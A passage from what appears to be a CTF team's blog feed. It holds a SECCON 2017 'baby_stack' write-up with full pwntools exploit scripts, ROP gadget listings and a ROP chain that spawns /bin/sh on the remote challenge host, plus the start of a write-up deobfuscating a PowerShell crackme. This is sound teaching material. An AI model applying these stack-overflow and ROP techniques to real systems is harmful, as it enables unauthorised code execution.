0x4141414141414141)</span><br></pre></td></tr></table></figure><p>In this case we are replacing the number of characters that are going to be printed by printf! for example if we set the next 8 bytes to be <strong><code>0x0000000000000002</code></strong>, <strong><code>printf</code></strong> will print 2 characters starting by the address we gave before in the previous 8 bytes (<strong><code>0xc82003fd58</code></strong>). So lets readjust our script to do this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">104</span> + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</span><br><span class="line">process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line">r.sendline(padding)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python writeup.py</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">Thank you, \x18\x00\x00!</span><br><span class="line">msg : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>As you can see we are no longer seg faulting and as I said before you can see that only 3 bytes are being printed after the string “Thank you, “ we need to calculate the offset to the next <strong><code>printf</code></strong> and do the same thing, give an address and the number of bytes to be printed, <strong>only then</strong> we can <strong>replace the return address</strong> with success! So after calculating everything our script will look like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">off_printf1 = <span class="number">104</span></span><br><span class="line">off_printf2 = <span class="number">80</span></span><br><span class="line">off_retaddress = <span class="number">192</span></span><br><span class="line">padding_printf1 = <span class="string">'A'</span> * off_printf1 + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</span><br><span class="line">padding_printf2 = <span class="string">'A'</span> * off_printf2 + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</span><br><span class="line">padding_retaddresss = <span class="string">'A'</span>*off_retaddress + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">padding = padding_printf1 + padding_printf2 + padding_retaddresss</span><br><span class="line">r = process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line">r.sendline(padding)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>And finally we succefully smashed the stack! and replaced the return address to <strong><code>0xdeadbeef</code></strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python writeup.py </span><br><span class="line">...</span><br><span class="line">Thank you, \x18\x00\x00!</span><br><span class="line">msg : X�</span><br><span class="line">unexpected fault address 0xdeadbeef</span><br><span class="line">fatal error: fault</span><br><span class="line">[signal 0xb code=0x1 addr=0xdeadbeef pc=0xdeadbeef]</span><br></pre></td></tr></table></figure></p><h3 id="Build-a-ropchain"><a href="#Build-a-ropchain" class="headerlink" title="Build a ropchain"></a>Build a ropchain</h3><p>Now that we replaced the return address to <strong><code>0xdeadbeef</code></strong> we can finally start by doing our ropchain, to build this ropchain we need to know a bit of assembly but first we need to know how a syscall works as assembly and which registers it uses as arguments:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall(RAX, RDI, RSI, RDX)</span><br></pre></td></tr></table></figure><p>Where <strong><code>RAX</code></strong> is the system call number and <strong><code>RDI</code></strong> must have an address that points into <strong>‘/bin/sh’</strong> the rest of the registers are about the arguments! in this case we can just set them into zeros… So to build a successful ropchain we need to search some good gadgets.</p><h4 id="Setting-bin-sh-address-to-RDI"><a href="#Setting-bin-sh-address-to-RDI" class="headerlink" title="Setting /bin/sh address to RDI"></a>Setting /bin/sh address to RDI</h4><p>First of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/VtO8xjO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VtO8xjO.png" alt=""><br></a></p><p><strong>.bss</strong> is perfect its address doesn’t change on different runs because <strong><code>PIE</code></strong> protection isn’t enabled, and as the picture above says in IDA we have <strong><code>read</code></strong> and <strong><code>write</code></strong> permissions which is what we want.</p><p>Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be <strong><code>MOV [RDI], RAX</code></strong>, with the preference that it’s a <strong>qword MOV</strong>, since <strong>/bin/sh</strong> is a quite <strong>big string</strong> we need a <strong>64bit MOV</strong> (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPGadgets</a>, if we have a 64bit MOV:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'mov qword ptr \[rdi\], '</span></span><br><span class="line">0x000000000045681b : clc ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</span><br><span class="line">0x0000000000456826 : mov eax, dword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</span><br><span class="line">0x0000000000456490 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rax ; ret</span><br><span class="line">0x000000000045681c : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</span><br><span class="line">0x0000000000456499 : mov qword ptr [rdi], rax ; ret</span><br><span class="line">0x0000000000456825 : mov rax, qword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</span><br></pre></td></tr></table></figure><p>There we go, the <strong><code>mov qword ptr [rdi], rax ; ret</code></strong> is the gadget we need! we just need to store the .bss address into <strong><code>RDI</code></strong>, and the string <strong>/bin/sh</strong> into <code>RAX</code>, to store them into <strong><code>RDI</code></strong> and <strong><code>RAX</code></strong> we need gadgets like <strong><code>POP RDI ; RET</code></strong> and <strong><code>POP RAX ; RET</code></strong>, this gadgets will get the value on the top of the stack and store it in the respective register that’s what <strong><code>POP</code></strong> does:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rdi ;'</span></span><br><span class="line">0x000000000044a282 : pop rdi ; adc eax, 0x24448900 ; and byte ptr [rcx], bh ; ret</span><br><span class="line">0x000000000042274f : pop rdi ; add byte ptr [rax], al ; add rsp, 0x20 ; ret</span><br><span class="line">0x0000000000429eea : pop rdi ; call 0x401008</span><br><span class="line">0x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span><br><span class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rax ; ret'</span></span><br><span class="line">0x00000000004016ea : pop rax ; ret</span><br><span class="line">0x0000000000429283 : pop rax ; ret 0xf66</span><br></pre></td></tr></table></figure><p>We have both gadgets but as we can see the <strong><code>pop rdi ; or byte ptr [rax + 0x39], cl ; ret</code></strong> gadget has an instruction between <strong><code>POP RDI</code></strong> and <strong><code>RET</code></strong>, We require to set <strong><code>RAX</code></strong> into a valid address before using this gadget <strong>otherwise we SEGFAULT</strong>. </p><p>Finally we have everything we need to store the address of /bin/sh into <code>RDI</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setting /bin/sh into bss address</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000470931</span>) <span class="comment"># pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456499</span>) <span class="comment"># mov qword ptr [rdi], rax ; ret</span></span><br></pre></td></tr></table></figure><h4 id="Clearing-RSI-and-RDX"><a href="#Clearing-RSI-and-RDX" class="headerlink" title="Clearing RSI and RDX"></a>Clearing RSI and RDX</h4><p>Now that we have the address of <strong>/bin/sh</strong> in <strong><code>RDI</code></strong> we need to clear the registers <strong><code>RSI</code></strong> and <strong><code>RDX</code></strong> into zero, we can do this with <strong><code>POP RET</code></strong> gadgets : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clear rsi and rdx registers</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004a247c</span>) <span class="comment"># pop rdx ; or byte ptr [rax - 0x77], cl ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x000000000046defd</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure><p>And finally we can’t forget to set <strong><code>RAX</code></strong> into the execve system call number which is <strong><code>0x3b</code></strong>, you can get a full list of system call numbers at <a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener">https://filippo.io/linux-syscall-table/</a> , once again we can use <strong><code>POP RET</code></strong> gadget to do this:</p><h4 id="Setting-0x3b-into-RAX"><a href="#Setting-0x3b-into-RAX" class="headerlink" title="Setting 0x3b into RAX"></a>Setting 0x3b into RAX</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setting rax into execve 0x3b syscall number</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system call</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456889</span>) <span class="comment"># syscall ; ret</span></span><br></pre></td></tr></table></figure><p>My final Exploit will look like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'baby_stack.pwn.seccon.jp'</span>, <span class="number">15285</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">104</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">BSS = <span class="number">0x59F920</span></span><br><span class="line">ropchain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting /bin/sh into bss address</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000470931</span>) <span class="comment"># pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456499</span>) <span class="comment"># mov qword ptr [rdi], rax ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear rsi and rdx registers</span></span><br><span class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004a247c</span>) <span class="comment"># pop rdx ; or byte ptr [rax - 0x77], cl ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x000000000046defd</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting rax into execve 0x3b syscall number</span></span><br><span class="line">ropchain += p64(<span class="number">0x00000000004016ea</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += p64(<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system call</span></span><br><span class="line">ropchain += p64(<span class="number">0x0000000000456889</span>) <span class="comment"># syscall ; ret</span></span><br><span class="line">r.sendline(padding + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x00</span>) + <span class="string">'A'</span>*<span class="number">80</span> + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x00</span>) + <span class="string">'A'</span>*<span class="number">192</span> + ropchain)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>By running it we can get the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python back_stack.py</span><br><span class="line">[+] Opening connection to baby_stack.pwn.seccon.jp on port 15285: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Thank you, !</span><br><span class="line">msg : </span><br><span class="line">$ ls</span><br><span class="line">baby_stack</span><br><span class="line">flag.txt</span><br><span class="line">$ id</span><br><span class="line">uid=30831 gid=30000(baby_stack) groups=30000(baby_stack)</span><br><span class="line">$ cat flag.txt</span><br><span class="line">SECCON&#123;<span class="string">'un54f3'</span>m0dul3_15_fr13ndly_70_4774ck3r5&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Baby Stack&lt;br&gt;&lt;br&gt;Can you do a traditional stack attack?&lt;br&gt;&lt;br&gt;Host : baby_stack.pwn.seccon.jp&lt;br&gt;Port : 15285&lt;br&gt;baby_stac
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="go" scheme="https://teamrocketist.github.io/tags/go/"/>
    
      <category term="statically_linked" scheme="https://teamrocketist.github.io/tags/statically-linked/"/>
    
      <category term="seccon2017" scheme="https://teamrocketist.github.io/tags/seccon2017/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] SECCON - Powerful_Shell</title>
    <link href="https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/"/>
    <id>https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/</id>
    <published>2017-12-10T10:03:07.000Z</published>
    <updated>2018-10-24T23:21:04.834Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Powerful_Shell<br>300 points<br>Powerful_Shell<br><br>Crack me.<br>powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfca21ab53db15c98797b500c739b0024<br></blockquote><p>Windows powershell… We started by analysing the file:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ECCON</span>=<span class="string">""</span>;</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">3783</span>/<span class="number">291</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">6690</span>/<span class="number">669</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">776</span>-<span class="number">740</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">381</span>-<span class="number">312</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">403</span>-<span class="number">289</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">301</span>+<span class="number">415</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">143</span>-<span class="number">32</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">93594</span>/<span class="number">821</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">626</span>-<span class="number">561</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">86427</span>/<span class="number">873</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">112752</span>/<span class="number">972</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">43680</span>/<span class="number">416</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">95127</span>/<span class="number">857</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">682</span>+<span class="number">792</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">230</span>+<span class="number">310</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">732</span>+<span class="number">846</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">1027</span>-<span class="number">926</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">94044</span>/<span class="number">922</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">898</span>-<span class="number">797</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">976</span>-<span class="number">862</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">52419</span>/<span class="number">519</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">1430</span>/<span class="number">13</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">18216</span>/<span class="number">184</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">21715</span>/<span class="number">215</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">12320</span>/<span class="number">385</span>);</span><br><span class="line"><span class="variable">$ECCON</span>+=[char]([int][Math]::sqrt([Math]::pow(<span class="number">61</span>,<span class="number">2</span>)));</span><br><span class="line">.....</span><br><span class="line"><span class="built_in">Write-Progress</span> -Activity <span class="string">"Extracting Script"</span> -status <span class="string">"20040"</span> -percentComplete <span class="number">99</span>;</span><br><span class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">520</span>-<span class="number">510</span>);</span><br><span class="line"><span class="built_in">Write-Progress</span> -Completed -Activity <span class="string">"Extracting Script"</span>;.([ScriptBlock]::Create(<span class="variable">$ECCON</span>))</span><br></pre></td></tr></table></figure><p>As we can see we have alot of operations, it looks like something is being hidden behind those arithmetic operations, I did a python script to parse all the operation using regex:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">script = <span class="string">''</span></span><br><span class="line">lines = open(<span class="string">'powerful_shell'</span>,<span class="string">'r'</span>).read().split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"><span class="keyword">if</span> <span class="string">'sqrt'</span> <span class="keyword">in</span> line:</span><br><span class="line">op = line.replace(<span class="string">'$ECCON+=[char]([int][Math]::'</span>,<span class="string">''</span>).replace(<span class="string">'[Math]::'</span>,<span class="string">''</span>).replace(<span class="string">';'</span>,<span class="string">''</span>).replace(<span class="string">')'</span>,<span class="string">''</span>) + <span class="string">'))'</span></span><br><span class="line">script += chr(int(eval(op)))</span><br><span class="line"><span class="keyword">elif</span> <span class="string">'$ECCON'</span> <span class="keyword">in</span> line <span class="keyword">and</span> len(re.findall(<span class="string">r'\((-*[0-9]+.-*[0-9]+)\)'</span>, line)) &gt; <span class="number">0</span>:</span><br><span class="line">op = re.findall(<span class="string">r'\((-*[0-9]+.-*[0-9]+)\)'</span>, line)[<span class="number">0</span>]</span><br><span class="line">script += chr(int(eval(op)))</span><br><span class="line"><span class="keyword">print</span> script</span><br></pre></td></tr></table></figure><p>After extracting it we got this:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">... truncanted ...</span><br><span class="line"></span><br><span class="line"><span class="variable">$keytone</span>=@&#123;<span class="string">'a'</span>=<span class="number">261.63</span>&#125;</span><br><span class="line"><span class="variable">$pk</span>=<span class="string">'a'</span></span><br><span class="line"><span class="keyword">ForEach</span>(<span class="variable">$k</span> <span class="keyword">in</span> (<span class="string">'w'</span>,<span class="string">'s'</span>,<span class="string">'e'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'t'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'h'</span>,<span class="string">'u'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>))&#123;</span><br><span class="line"><span class="variable">$keytone</span>+=@&#123;<span 